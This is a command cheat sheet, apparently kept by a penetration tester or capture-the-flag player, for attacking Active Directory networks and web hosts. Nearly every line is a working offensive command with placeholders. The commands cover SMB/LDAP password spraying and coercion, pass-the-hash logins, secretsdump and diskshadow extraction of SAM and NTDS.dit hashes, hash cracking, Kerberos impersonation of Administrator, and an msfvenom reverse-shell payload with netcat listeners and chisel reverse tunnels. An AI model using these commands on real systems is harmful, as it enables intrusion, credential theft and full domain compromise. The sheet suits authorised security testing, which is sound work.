# nmap
nmap -p- -vvv --min-rate 10000 <target>
nmap -p <ports> -sCV <target>
nmap -sCV -p <ports> <target>
nmap -vv -p <ports> -sCV <target>

# netexec
netexec smb <target> --generate-hosts-file <file>
netexec smb <target> -u <user> -p <pass> --shares
netexec smb <target> -u <user> -p <pass> --continue-on-success
netexec smb <target> -u <user> -p <pass> -M change-password -o NEWPASS=<newpass>
netexec smb <target> -u <user> -p <pass> --pass-pol
netexec smb <target> -u <user> -H <hash>
netexec smb <target> -u <user> -p <pass> --rid-brute
netexec smb <target> -u <user$> -p <pass> -k --generate-tgt <tgt>
netexec smb <target> -u <user> -p <pass> -k --shares
netexec smb <target> -u <user> -p <pass> -k --generate-krb5-file <file>
netexec smb <target> -u <user$> -p <pass> -M coerce_plus
netexec ldap <target> -u <user> -p <pass> --query "<filter>" ""
netexec ldap <target> -u <user> -p <pass> --bloodhound --dns-server <ip> -c All
netexec ldap <target> -u <user> -p <pass> --computers
netexec ldap <target> -u <user> -p <pass> -M maq
netexec ldap <target> --use-kcache --gmsa
netexec winrm <target> -u <user> -p <pass>
netexec winrm <target> -u <user> -H <hash>
netexec rdp <target> -u <user> -p <pass>
netexec ssh <target> -u <user> -p <pass>

# evil-winrm
evil-winrm-py -i <host> -u <user> -p <pass>
evil-winrm-py -i <host> -u <user> -H <hash>
evil-winrm -r <realm> -i <dc>

# secretsdump
secretsdump.py -sam <sam> -system <system> LOCAL
secretsdump.py -ntds <ntds.dit> -system <system> LOCAL
secretsdump.py -just-dc -no-pass '<computer$@ip>'

# wmiexec
wmiexec.py -hashes :<hash> <domain>/<user>@<host>

# diskshadow / robocopy sequence
set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\<file>.cab
add volume c: alias <alias>
create
expose %<alias>% e:
diskshadow /s C:\programdata\backup
robocopy /b E:\Windows\ntds . ntds.dit

# smbclient / smbserver
smbclient -N //<host>/<share>
smbserver.py <share> . -smb2support -username <user> -password <pass>

# hashcat / john
/opt/john/run/office2john.py <file> | tee <hashfile>
hashcat <hashfile> <wordlist> --user
hashcat -m 1000 <hashfile> <wordlist>
hashcat <hashfile> -a 3 <mask>

# Kerberos / AD
addcomputer.py -computer-name <name> -computer-pass <pass> -dc-host <dc> <domain>/<user>:<pass>
getST.py -spn <service> -hashes :<hash> '<principal>' -impersonate Administrator
echo "<string>" | kinit <principal>
KRB5CCNAME=<cache> <command>
bloodyAD -d <domain> --host <dc> -k get object <obj> --attr <attr>
bloodyAD -d <domain> --host <dc> -u <user> -p <pass> -k get object <obj> --attr <attr>

# uv (script runner)
uv add --script <script.py> <module>
uv run --script <script.py>
uv run --script <script.py> <args>

# rusthound / bloodhound
rusthound-ce --domain <domain> -u <user> -p <pass> --zip
bloodhound-ce-python -u <user> -p <pass> -d <domain> -ns <ip> -c All --zip

# ffuf / feroxbuster
ffuf -u http://<host>/FUZZ -w <wordlist> -ac
ffuf -u http://<host>/<path> -d '<post-data-with-FUZZ>' -w <wordlist> -mr <match>
feroxbuster -u http://<host> -x php
feroxbuster -u http://<host> -x php --dont-extract-links

# reverse shells / tunneling
echo '<payload>' | base64
nc -lnvp <port>
rlwrap -cAr nc -lnvp <port>
chisel server -p <port> --reverse
./c.exe client <host>:<port> R:socks
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <file>

# gpg / openssl
openssl req -newkey rsa:2048 -keyout <file.key> -out <file.csr>
openssl x509 -req -in <csr> -CA <ca.crt> -CAkey <ca.key> -CAcreateserial -out <cert>
gpg --generate-key
gpg -u <id> --detach-sign <file>
gpg --export -a <id> | tee <pub.asc>

# misc system
exiftool <file>
tcpdump -ni <iface> icmp
tcpdump -i eth0 ip6
sudo ntpdate <host>
icacls.exe <file> /grant Everyone:F
sc.exe query <service>
sc.exe start <service>
script /dev/null -c bash
stty raw -echo; fg
